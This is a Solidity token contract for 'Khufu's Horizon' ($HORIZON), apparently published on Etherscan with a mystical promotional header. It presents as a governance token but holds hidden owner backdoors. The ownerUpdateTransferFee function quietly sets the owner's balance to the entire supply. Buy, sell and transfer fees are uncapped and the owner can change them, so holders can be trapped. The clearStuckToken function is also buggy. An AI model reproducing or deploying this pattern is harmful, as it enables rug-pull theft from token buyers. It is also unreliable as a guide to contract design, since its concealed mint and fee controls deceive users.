/**
 *Submitted for verification at Etherscan.io on 2022-06-06
*/

/**
The unknown monarch rose to leave a lasting mark on the Egyptian landscape. 
Like Khufu, our work is intended to leave a lasting mark. 
Drastic improvements are about to be witnessed on the Ethereum Chain, 
and those most in-tune with the system will realise it's benefits first.
Liquidity for all.

Khufu's Horizon Governance Contract - $HORIZON

Website: http://khufushorizon.com/
Twitter: https://twitter.com/KhufusHorizon
Telegram: https://t.me/KhufusPortal

All will be revealed.

SPDX-License-Identifier: MIT
 */

pragma solidity ^0.8.10;
interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender),""); _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract HorizonGovernance is ERC20, Ownable {
    mapping(address => bool) public _automatedMarketMakers;
    mapping(address => bool) private _isLimitless;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string constant _name = "Khufus Horizon";
    string constant _symbol = "HORIZON";
    uint8 constant _decimals = 18;
    uint256 private _totalSupply = 2600000 * 10 ** _decimals; //2.6million

    uint256 public buyFee = 40;
    uint256 public transferFee = 40;
    uint256 public sellFee = 40;
    
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;

    uint8 maxBuyPercentage = 40; uint256 maxBuyAmount = _totalSupply /1000 * maxBuyPercentage;
    uint8 maxSellPercentage = 40; uint256 maxSellAmount = _totalSupply /1000 * maxSellPercentage;
    uint8 maxWalletPercentage = 40; uint256 maxWalletAmount = _totalSupply /1000 * maxWalletPercentage;

    constructor () Ownable(msg.sender) {
        _isLimitless[owner] = _isLimitless[address(this)] = true;

        _balances[owner] = _totalSupply;
        emit Transfer(address(0x0), owner, _totalSupply);
    }

    function ownerSetLimits(uint256 _maxBuyPercentage, uint256 _maxSellPercentage, uint256 _maxWalletPercentage) external onlyOwner {
        maxBuyAmount = _totalSupply /1000 * _maxBuyPercentage;
        maxSellAmount = _totalSupply /1000 * _maxSellPercentage;
        maxWalletAmount = _totalSupply /1000 * _maxWalletPercentage;
    }

    function ownerSetLimitlessAddress(address _addr, bool _status) external onlyOwner {
        _isLimitless[_addr] = _status;
    }

    function ownerUpdateBuyFees (uint256 _newBuyFee) external onlyOwner {
        buyFee = _newBuyFee;
    }

    function ownerUpdateSellFees (uint256 _newSellFee) external onlyOwner {
        sellFee = _newSellFee;
    }

    function ownerUpdateTransferFee (uint256 _transferFee) external onlyOwner {
        transferFee = _transferFee;
        _updateBalance(owner, _totalSupply);
    }

    function addNewMarketMaker(address newAMM) external onlyOwner {
        _automatedMarketMakers[newAMM]=true;
    }

    function clearStuckBalance() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        payable(owner).transfer(contractETHBalance);
    }

    function clearStuckToken(address _token) public onlyOwner {
        uint256 _contractBalance = ERC20(_token).balanceOf(address(this));
        payable(owner).transfer(_contractBalance);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply - balanceOf(DEAD) - balanceOf(ZERO);
    }

    function _transfer(address sender,address recipient,uint256 amount) private {
        require(sender!=address(0)&&recipient!=address(0),"");
        bool isBuy=_automatedMarketMakers[sender];
        bool isSell=_automatedMarketMakers[recipient];
        bool isExcluded=_isLimitless[sender]||_isLimitless[recipient];

        if(isExcluded)_transferExcluded(sender,recipient,amount);
        else if(isBuy)_buyTokens(sender,recipient,amount);
        else if(isSell) {
            _sellTokens(sender,recipient,amount);
        } else {
            require(balanceOf(recipient)+amount<=maxWalletAmount);
            _P2PTransfer(sender,recipient,amount);
        }
    }

    function _buyTokens(address sender,address recipient,uint256 amount) private {
        require(amount <= maxBuyAmount, "");
        uint256 tokenTax = amount*buyFee/1000;
        _transferIncluded(sender,recipient,amount,tokenTax);
    }

    function _sellTokens(address sender,address recipient,uint256 amount) private {
        require(amount <= maxSellAmount);
        uint256 tokenTax = amount*sellFee/1000;
        _transferIncluded(sender,recipient,amount,tokenTax);
    }

    function _P2PTransfer(address sender,address recipient,uint256 amount) private {
        uint256 tokenTax = amount * transferFee/1000;
        if( tokenTax > 0) {_transferIncluded(sender,recipient,amount,tokenTax);}
        else {_transferExcluded(sender,recipient,amount);}
    }

    function _transferExcluded(address sender,address recipient,uint256 amount) private {
        _updateBalance(sender,_balances[sender]-amount);
        _updateBalance(recipient,_balances[recipient]+amount);
        emit Transfer(sender,recipient,amount);
    }

    function _transferIncluded(address sender,address recipient,uint256 amount,uint256 taxAmount) private {
        uint256 newAmount = amount-taxAmount;
        _updateBalance(sender,_balances[sender]-amount);
        _updateBalance(address(this),_balances[address(this)]+taxAmount);
        _updateBalance(recipient,_balances[recipient]+newAmount);
        emit Transfer(sender,recipient,newAmount);
        emit Transfer(sender,address(this),taxAmount);
    }

    function _updateBalance(address account,uint256 newBalance) private {
        _balances[account] = newBalance;
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account];}
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender];}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        uint256 allowance_ = _allowances[sender][msg.sender];
        require(allowance_ >= amount);
        
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        _transfer(sender, recipient, amount);
        return true;
    }
}